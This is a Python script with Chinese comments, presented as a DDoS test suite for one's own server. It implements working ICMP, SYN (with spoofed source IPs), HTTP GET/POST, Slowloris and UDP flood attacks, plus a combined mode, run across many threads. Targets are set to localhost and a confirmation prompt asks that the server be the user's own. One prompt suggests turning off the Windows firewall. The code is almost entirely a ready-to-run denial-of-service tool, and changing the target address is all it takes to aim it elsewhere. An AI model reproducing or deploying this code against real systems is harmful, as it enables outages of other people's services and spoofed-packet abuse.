
"""
DDoS 攻擊測試套件
包含多種攻擊方式，僅用於測試自己的伺服器
"""
import socket
import threading
import time
import random
import requests
import struct
import sys
from collections import Counter

# ===== 配置區 =====
# 自動取得網卡 IP
def get_local_ip():
    """自動取得本機網卡 IP (非 127.0.0.1)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "192.168.0.201"  # 備用值

TARGET_IP = "127.0.0.1"              # 本機測試 (HTTP/TCP 有效)
TARGET_IP_REAL = get_local_ip()      # 自動偵測網卡 IP (用於 ICMP)
TARGET_PORT = 8000                   # 對應 muti_server.py 的 TCP_PORT
UDP_TARGET_PORT = 9001               # 對應 muti_server.py 的 UDP_PORT
THREAD_COUNT = 50                    # 增加線程數以產生明顯效果
DURATION = 30                        # 秒

print(f"\n🌐 自動偵測到網卡 IP: {TARGET_IP_REAL}")
print(f"📌 本機測試 IP: {TARGET_IP}\n")
# ==================

class AttackStats:
    """統計資訊與延遲監控"""
    def __init__(self):
        self.packets_sent = 0
        self.connections_made = 0
        self.requests_sent = 0
        self.errors = Counter()
        self.latencies = []  # 記錄延遲
        self.start_times = {}  # 記錄開始時間
        self.bandwidth_used = 0  # 佔用頻寬 (bytes)
        self.memory_snapshots = []  # 記憶體快照
        self.cpu_snapshots = []  # CPU 快照
        self.lock = threading.Lock()
    
    def increment(self, metric, value=1):
        with self.lock:
            if metric == "packets":
                self.packets_sent += value
            elif metric == "connections":
                self.connections_made += value
            elif metric == "requests":
                self.requests_sent += value
            elif metric == "bandwidth":
                self.bandwidth_used += value
    
    def add_error(self, error_type):
        with self.lock:
            self.errors[error_type] += 1
    
    def record_latency(self, latency_ms):
        """記錄延遲時間 (毫秒)"""
        with self.lock:
            self.latencies.append(latency_ms)
            # 只保留最近 1000 筆
            if len(self.latencies) > 1000:
                self.latencies.pop(0)
    
    def get_avg_latency(self):
        """取得平均延遲"""
        with self.lock:
            if not self.latencies:
                return 0
            return sum(self.latencies) / len(self.latencies)
    
    def get_latency_stats(self):
        """取得延遲統計"""
        with self.lock:
            if not self.latencies:
                return {'min': 0, 'max': 0, 'avg': 0, 'p95': 0}
            sorted_lat = sorted(self.latencies)
            p95_idx = int(len(sorted_lat) * 0.95)
            return {
                'min': min(sorted_lat),
                'max': max(sorted_lat),
                'avg': sum(sorted_lat) / len(sorted_lat),
                'p95': sorted_lat[p95_idx] if p95_idx < len(sorted_lat) else sorted_lat[-1]
            }
    
    def get_stats(self):
        with self.lock:
            return {
                'packets': self.packets_sent,
                'connections': self.connections_made,
                'requests': self.requests_sent,
                'bandwidth_mb': self.bandwidth_used / (1024 * 1024),
                'errors': dict(self.errors),
                'latency': self.get_latency_stats()
            }

stats = AttackStats()
running = False

# ==================== 1. ICMP Flood ====================
class ICMPFlood:
    """ICMP Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def checksum(data):
        """計算 ICMP 校驗和"""
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i] << 8) + data[i + 1]
        if n:
            s += data[-1] << 8
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s
    
    @staticmethod
    def create_icmp_packet():
        """創建 ICMP Echo Request 封包"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        # 封包標頭
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        data = b'A' * 56  # 資料部分
        
        # 計算校驗和
        icmp_checksum = ICMPFlood.checksum(header + data)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        return header + data
    
    @staticmethod
    def attack(target_ip, duration):
        """執行 ICMP Flood"""
        global running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            print(f"🔵 ICMP Flood 執行緒已啟動 → {target_ip}")
        except PermissionError:
            print("❌ ICMP Flood 需要 root/管理員權限")
            print("💡 Linux/Mac: sudo python3 script.py")
            print("💡 Windows: 以管理員身份執行")
            return
        except Exception as e:
            print(f"❌ ICMP Flood 初始化失敗: {e}")
            return
        
        while running:
            try:
                packet = ICMPFlood.create_icmp_packet()
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
                # 無延遲，盡可能快速發送
            except Exception as e:
                stats.add_error(f"ICMP: {type(e).__name__}")
                time.sleep(0.001)  # 錯誤時短暫延遲
        
        sock.close()
        print(f"🔵 ICMP Flood 執行緒已停止")

# ==================== 2. SYN Flood ====================
class SYNFlood:
    """SYN Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def create_ip_header(source_ip, dest_ip):
        """創建 IP 標頭"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel 會填充
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl,
                                ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header
    
    @staticmethod
    def create_tcp_syn(source_ip, source_port, dest_ip, dest_port):
        """創建 TCP SYN 封包"""
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1  # SYN flag
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window,
                                 tcp_check, tcp_urg_ptr)
        
        # 偽標頭用於計算校驗和
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = SYNFlood.checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window) + \
                     struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return tcp_header
    
    @staticmethod
    def checksum(msg):
        """計算校驗和"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = msg[i] << 8
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 SYN Flood"""
        global running
        try:
            # Windows 需要使用不同的 socket 類型
            import platform
            if platform.system() == 'Windows':
                # Windows: 使用 IPPROTO_IP 可以發送自訂 IP 封包
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            else:
                # Linux/Mac: 使用 IPPROTO_TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("❌ SYN Flood 需要 root/管理員權限")
            print("💡 請改用 SYN Flood (簡化版)")
            return
        except OSError as e:
            print(f"❌ SYN Flood 初始化失敗: {e}")
            print("💡 Windows 可能需要特殊網路設定或請改用選項 3")
            return
        
        print(f"🔴 SYN Flood 已啟動 → {target_ip}:{target_port}")
        
        while running:
            try:
                # 隨機源 IP 和端口
                source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = SYNFlood.create_ip_header(source_ip, target_ip)
                tcp_header = SYNFlood.create_tcp_syn(source_ip, source_port, target_ip, target_port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
            except Exception as e:
                stats.add_error(f"SYN: {type(e).__name__}")
        
        sock.close()

# ==================== 3. SYN Flood (簡化版) ====================
class SYNFloodSimple:
    """SYN Flood 簡化版（不需要 root 權限）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """
        簡化版 SYN Flood
        通過快速創建和丟棄連接來模擬 SYN Flood 效果
        """
        global running
        print(f"🟡 SYN Flood (簡化版) 執行緒已啟動 → {target_ip}:{target_port}")
        
        sockets_pool = []  # 保留部分半開連接
        
        while running:
            try:
                start_time = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)  # 極短超時
                sock.setblocking(False)
                
                try:
                    sock.connect((target_ip, target_port))
                except (BlockingIOError, socket.error):
                    # 預期的錯誤，連接尚未完成
                    pass
                
                latency_ms = (time.time() - start_time) * 1000
                stats.record_latency(latency_ms)
                stats.increment("connections")
                
                # 保留一些半開連接，其他關閉以避免耗盡本地端口
                if len(sockets_pool) < 50:
                    sockets_pool.append(sock)
                else:
                    try:
                        sock.close()
                    except:
                        pass
                
                # 定期清理舊連接
                if len(sockets_pool) >= 50:
                    old_sock = sockets_pool.pop(0)
                    try:
                        old_sock.close()
                    except:
                        pass
                        
            except Exception as e:
                stats.add_error(f"SYN-Simple: {type(e).__name__}")
                time.sleep(0.01)
        
        # 清理
        for sock in sockets_pool:
            try:
                sock.close()
            except:
                pass
        
        print(f"🟡 SYN Flood (簡化版) 執行緒已停止")

# ==================== 4. HTTP Request Flood ====================
class HTTPFlood:
    """HTTP Request Flood（最有效）"""
    
    @staticmethod
    def attack(target_url, method="GET", duration=30):
        """執行 HTTP Flood"""
        global running
        print(f"🟢 HTTP {method} Flood 已啟動 → {target_url}")
        
        session = requests.Session()
        
        paths = ["/", "/api", "/search", "/login", "/data", "/admin"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ]
        
        while running:
            try:
                url = target_url + random.choice(paths)
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                }
                
                start_time = time.time()
                
                if method == "GET":
                    response = session.get(url, headers=headers, timeout=2)
                elif method == "POST":
                    data = {"test": random.randint(1, 10000)}
                    response = session.post(url, json=data, headers=headers, timeout=2)
                
                latency_ms = (time.time() - start_time) * 1000
                stats.record_latency(latency_ms)
                stats.increment("requests")
                stats.increment("bandwidth", len(response.content))
                
            except requests.exceptions.Timeout:
                stats.add_error("HTTP Timeout")
                stats.record_latency(2000)  # 超時記為 2000ms
            except requests.exceptions.ConnectionError:
                stats.add_error("HTTP Connection Error")
            except Exception as e:
                stats.add_error(f"HTTP: {type(e).__name__}")

# ==================== 5. Slowloris 攻擊 ====================
class Slowloris:
    """Slowloris 慢速攻擊（消耗連接資源）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 Slowloris 攻擊"""
        global running
        print(f"🟣 Slowloris 執行緒已啟動 → {target_ip}:{target_port}")
        
        sockets = []
        
        # 創建大量半完成的 HTTP 請求
        for _ in range(200):
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                
                # 發送不完整的 HTTP 請求
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                
                sockets.append(sock)
                stats.increment("connections")
            except:
                pass
        
        print(f"  已建立 {len(sockets)} 個連接")
        
        # 持續發送不完整的標頭來保持連接
        while running:
            try:
                for sock in list(sockets):
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        stats.increment("packets")
                    except:
                        sockets.remove(sock)
                
                time.sleep(10)  # 每 10 秒發送一次
                
            except Exception as e:
                stats.add_error(f"Slowloris: {type(e).__name__}")
        
        # 清理
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print(f"🟣 Slowloris 執行緒已停止")

# ==================== 6. UDP Flood ====================
class UDPFlood:
    """UDP Flood 攻擊"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 UDP Flood"""
        global running
        print(f"🔵 UDP Flood 執行緒已啟動 → {target_ip}:{target_port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception as e:
            print(f"❌ UDP Socket 創建失敗: {e}")
            return
        
        # 隨機資料負載
        payload_sizes = [64, 128, 256, 512, 1024, 1472]  # 1472 是以太網 MTU 的安全值
        
        while running:
            try:
                size = random.choice(payload_sizes)
                payload = random.randbytes(size)
                sock.sendto(payload, (target_ip, target_port))
                stats.increment("packets")
            except Exception as e:
                stats.add_error(f"UDP: {type(e).__name__}")
                time.sleep(0.001)
        
        sock.close()
        print(f"🔵 UDP Flood 執行緒已停止")

# ==================== 主程式 ====================
def print_stats_loop(start_time):
    """持續顯示統計資訊"""
    global running
    while running:
        elapsed = time.time() - start_time
        current_stats = stats.get_stats()
        avg_latency = stats.get_avg_latency()
        
        sys.stdout.write("\r" + " " * 200 + "\r")
        sys.stdout.write(
            f"⚡ 封包: {current_stats['packets']:,} | "
            f"連接: {current_stats['connections']:,} | "
            f"請求: {current_stats['requests']:,} | "
            f"延遲: {avg_latency:.1f}ms | "
            f"頻寬: {current_stats['bandwidth_mb']:.2f}MB | "
            f"時間: {elapsed:.1f}s"
        )
        sys.stdout.flush()
        
        time.sleep(0.5)

def generate_attack_report(attack_type, elapsed_time, final_stats):
    """生成攻擊測試報告"""
    latency_stats = final_stats['latency']
    
    print("\n\n" + "="*80)
    print("📊 DDoS 攻擊測試報告")
    print("="*80)
    
    print(f"\n🎯 攻擊類型: {attack_type}")
    print(f"⏱️  執行時間: {elapsed_time:.2f} 秒")
    
    print("\n📈 攻擊統計:")
    print(f"  • 發送封包數: {final_stats['packets']:,}")
    print(f"  • 建立連接數: {final_stats['connections']:,}")
    print(f"  • HTTP 請求數: {final_stats['requests']:,}")
    print(f"  • 佔用頻寬: {final_stats['bandwidth_mb']:.2f} MB")
    
    # 計算速率
    if elapsed_time > 0:
        pps = final_stats['packets'] / elapsed_time
        cps = final_stats['connections'] / elapsed_time
        rps = final_stats['requests'] / elapsed_time
        bw_rate = final_stats['bandwidth_mb'] / elapsed_time
        
        print("\n⚡ 攻擊速率:")
        if final_stats['packets'] > 0:
            print(f"  • 封包速率: {pps:,.0f} packets/sec")
        if final_stats['connections'] > 0:
            print(f"  • 連接速率: {cps:,.0f} connections/sec")
        if final_stats['requests'] > 0:
            print(f"  • 請求速率: {rps:,.0f} requests/sec")
        if final_stats['bandwidth_mb'] > 0:
            print(f"  • 頻寬速率: {bw_rate:.2f} MB/sec")
    
    print("\n🕐 延遲統計:")
    print(f"  • 最小延遲: {latency_stats['min']:.2f} ms")
    print(f"  • 平均延遲: {latency_stats['avg']:.2f} ms")
    print(f"  • 最大延遲: {latency_stats['max']:.2f} ms")
    print(f"  • P95 延遲: {latency_stats['p95']:.2f} ms")
    
    if final_stats['errors']:
        print("\n⚠️  錯誤統計:")
        for error, count in sorted(final_stats['errors'].items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  • {error}: {count:,}")
    
    # 資源消耗分析
    print("\n🔥 資源擁塞分析:")
    
    # 網路資源
    if final_stats['packets'] > 0 or final_stats['bandwidth_mb'] > 0:
        print("  📡 網路資源消耗:")
        if final_stats['packets'] > 10000:
            print(f"    ⚠️  HIGH - 封包洪水: {final_stats['packets']:,} 個封包可能導致網路擁塞")
        if final_stats['bandwidth_mb'] > 100:
            print(f"    ⚠️  HIGH - 頻寬耗盡: {final_stats['bandwidth_mb']:.1f} MB 可能佔滿頻寬")
    
    # 連接資源
    if final_stats['connections'] > 0:
        print("  🔌 連接資源消耗:")
        if final_stats['connections'] > 1000:
            print(f"    ⚠️  HIGH - 連接耗盡: {final_stats['connections']:,} 個連接可能耗盡伺服器連接池")
        if final_stats['connections'] > 100:
            print(f"    ⚠️  MEDIUM - 建立了 {final_stats['connections']:,} 個半開連接")
    
    # CPU 資源
    if final_stats['requests'] > 0:
        print("  💻 CPU 資源消耗:")
        if final_stats['requests'] > 10000:
            print(f"    ⚠️  HIGH - 請求處理: {final_stats['requests']:,} 個請求可能導致 CPU 過載")
    
    # 延遲影響
    if latency_stats['avg'] > 0:
        print("  ⏱️  延遲影響:")
        if latency_stats['avg'] > 1000:
            print(f"    ⚠️  CRITICAL - 平均延遲 {latency_stats['avg']:.0f}ms，服務嚴重降級")
        elif latency_stats['avg'] > 500:
            print(f"    ⚠️  HIGH - 平均延遲 {latency_stats['avg']:.0f}ms，服務明顯變慢")
        elif latency_stats['avg'] > 200:
            print(f"    ⚠️  MEDIUM - 平均延遲 {latency_stats['avg']:.0f}ms，使用者可感知")
        else:
            print(f"    ✅ LOW - 平均延遲 {latency_stats['avg']:.0f}ms，影響較小")
        
        if latency_stats['p95'] > 2000:
            print(f"    ⚠️  CRITICAL - P95 延遲 {latency_stats['p95']:.0f}ms，5% 請求嚴重超時")
    
    # 攻擊效果評估
    print("\n📊 攻擊效果評估:")
    
    if attack_type in ["ICMP Flood", "UDP Flood"]:
        if final_stats['packets'] > 100000:
            print("  🔴 極高 - 大量封包可能導致網路設備過載")
        elif final_stats['packets'] > 10000:
            print("  🟠 高 - 封包數量足以影響網路效能")
        else:
            print("  🟡 中 - 封包數量有限，影響較小")
    
    elif attack_type in ["SYN Flood", "SYN Flood (簡化版)"]:
        if final_stats['connections'] > 5000:
            print("  🔴 極高 - 大量半開連接可能耗盡連接表")
        elif final_stats['connections'] > 1000:
            print("  🟠 高 - 連接數足以影響伺服器效能")
        else:
            print("  🟡 中 - 連接數有限，影響較小")
    
    elif attack_type in ["HTTP GET Flood", "HTTP POST Flood"]:
        if final_stats['requests'] > 50000:
            print("  🔴 極高 - 大量請求可能導致應用層癱瘓")
        elif final_stats['requests'] > 10000:
            print("  🟠 高 - 請求數足以影響應用效能")
        else:
            print("  🟡 中 - 請求數有限，影響較小")
    
    elif attack_type == "Slowloris":
        if final_stats['connections'] > 100:
            print("  🔴 極高 - 長時間佔用連接可能導致新連接被拒絕")
        else:
            print("  🟡 中 - 連接數不足以完全阻斷服務")
    
    elif attack_type == "組合攻擊":
        total_impact = 0
        if final_stats['packets'] > 10000: total_impact += 1
        if final_stats['connections'] > 1000: total_impact += 1
        if final_stats['requests'] > 10000: total_impact += 1
        if latency_stats['avg'] > 500: total_impact += 1
        
        if total_impact >= 3:
            print("  🔴 極高 - 多維度攻擊造成嚴重資源擁塞")
        elif total_impact >= 2:
            print("  🟠 高 - 組合攻擊對多個資源造成壓力")
        else:
            print("  🟡 中 - 組合攻擊效果有限")
    
    print("\n💡 建議:")
    print("  1. 實施速率限制 (Rate Limiting)")
    print("  2. 配置連接超時與最大連接數")
    print("  3. 啟用 SYN Cookie 防護")
    print("  4. 使用 CDN 或反向代理進行流量過濾")
    print("  5. 監控異常流量並自動封鎖可疑 IP")
    
    print("\n" + "="*80)

def run_attack_suite():
    """執行攻擊測試套件"""
    global running
    
    print("="*80)
    print("💣 DDoS 攻擊測試套件")
    print("="*80)
    print("選擇攻擊類型:")
    print("1. ICMP Flood (需要管理員) - ⚠️ 127.0.0.1 無效，需用網卡 IP")
    print("2. SYN Flood (需要管理員) - ⚠️ Windows 防火牆會攔截")
    print("3. SYN Flood 簡化版 ✅ - 半開連接攻擊 (推薦)")
    print("4. HTTP GET Flood ✅ - 應用層攻擊 (推薦)")
    print("5. HTTP POST Flood ✅ - 應用層攻擊 (推薦)")
    print("6. Slowloris ✅ - 連接耗盡攻擊")
    print("7. UDP Flood ✅ - UDP 洪水攻擊")
    print("8. 組合攻擊 (3+4+6) 🔥 - 多重攻擊 (推薦)")
    print("="*80)
    print("\n💡 說明:")
    print("  - 選項 1-2 在 Windows 上效果有限 (防火牆 + OS 優化)")
    print("  - 選項 3-8 可直接測試，效果明顯")
    print("  - ICMP 測試需修改 TARGET_IP_REAL 為網卡 IP (非 127.0.0.1)")
    print("="*80)
    
    choice = input("\n選擇攻擊類型 (1-8): ").strip()
    
    # 根據選擇決定目標 IP
    if choice == "1" and TARGET_IP_REAL:
        target_ip = TARGET_IP_REAL
        print(f"\n💡 使用網卡 IP: {target_ip} (ICMP 測試)")
    else:
        target_ip = TARGET_IP
    
    confirm = input(f"\n⚠️  目標: {target_ip}:{TARGET_PORT}\n⚠️  請確認這是你自己的伺服器 (y/no): ")
    if confirm.lower() != "y":
        print("❌ 測試已取消")
        return
    
    print(f"\n🚀 啟動攻擊... (持續 {DURATION} 秒)")
    print(f"💡 提示: 同時開啟 muti_server.py 以監控攻擊效果\n")
    
    running = True
    threads = []
    start_time = time.time()
    
    # 啟動統計顯示執行緒
    stats_thread = threading.Thread(target=print_stats_loop, args=(start_time,), daemon=True)
    stats_thread.start()
    
    if choice == "1":
        # ICMP Flood
        if target_ip == "127.0.0.1":
            print("\n⚠️  警告: ICMP 對 127.0.0.1 無效!")
            print("   請修改腳本中的 TARGET_IP_REAL 為網卡 IP")
            print("   例如: TARGET_IP_REAL = '192.168.0.201'")
            alt = input("\n繼續測試? (y/n): ").strip().lower()
            if alt != 'y':
                return
        
        print(f"🔵 啟動 {THREAD_COUNT} 個 ICMP Flood 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=ICMPFlood.attack, args=(target_ip, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "2":
        # SYN Flood
        print("\n⚠️  注意: Windows 防火牆會攔截偽造封包")
        print("   建議:")
        print("   1. 暫時關閉防火牆: 控制台 → Windows Defender 防火牆 → 關閉")
        print("   2. 或使用選項 3 (SYN Flood 簡化版)")
        alt = input("\n繼續測試? (y/n): ").strip().lower()
        if alt != 'y':
            return
        
        print(f"🔴 啟動 {THREAD_COUNT} 個 SYN Flood 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=SYNFlood.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "3":
        # SYN Flood 簡化版
        print(f"🟡 啟動 {THREAD_COUNT} 個 SYN Flood (簡化版) 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "4":
        # HTTP GET Flood
        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP GET Flood 執行緒...\n")
        target_url = f"http://{target_ip}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "5":
        # HTTP POST Flood
        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP POST Flood 執行緒...\n")
        target_url = f"http://{target_ip}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "POST", DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "6":
        # Slowloris
        print(f"🟣 啟動 10 個 Slowloris 執行緒...\n")
        for _ in range(10):  # Slowloris 不需要太多執行緒
            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "7":
        # UDP Flood
        print(f"🔵 啟動 {THREAD_COUNT} 個 UDP Flood 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, UDP_TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "8":
        # 組合攻擊
        print("🔥 啟動組合攻擊:\n")
        
        # SYN Flood 簡化版
        print(f"  - {THREAD_COUNT // 3} 個 SYN Flood (簡化版)")
        for _ in range(THREAD_COUNT // 3):
            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
        
        # HTTP Flood
        print(f"  - {THREAD_COUNT // 3} 個 HTTP GET Flood")
        target_url = f"http://{target_ip}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT // 3):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
            t.start()
            threads.append(t)
        
        # Slowloris
        print(f"  - 5 個 Slowloris")
        for _ in range(5):
            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
        
        print()
    
    else:
        print("❌ 無效選擇")
        running = False
        return
    
    # 等待指定時間或 Ctrl+C
    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n\n⏹️  收到中斷信號...")
    
    running = False
    elapsed = time.time() - start_time
    
    # 等待執行緒結束
    for t in threads:
        t.join(timeout=1)
    
    # 獲取最終統計並生成報告
    final_stats = stats.get_stats()
    
    # 確定攻擊類型名稱
    attack_type_names = {
        "1": "ICMP Flood",
        "2": "SYN Flood",
        "3": "SYN Flood (簡化版)",
        "4": "HTTP GET Flood",
        "5": "HTTP POST Flood",
        "6": "Slowloris",
        "7": "UDP Flood",
        "8": "組合攻擊"
    }
    
    attack_name = attack_type_names.get(choice, "未知攻擊")
    generate_attack_report(attack_name, elapsed, final_stats)

if __name__ == "__main__":
    run_attack_suite()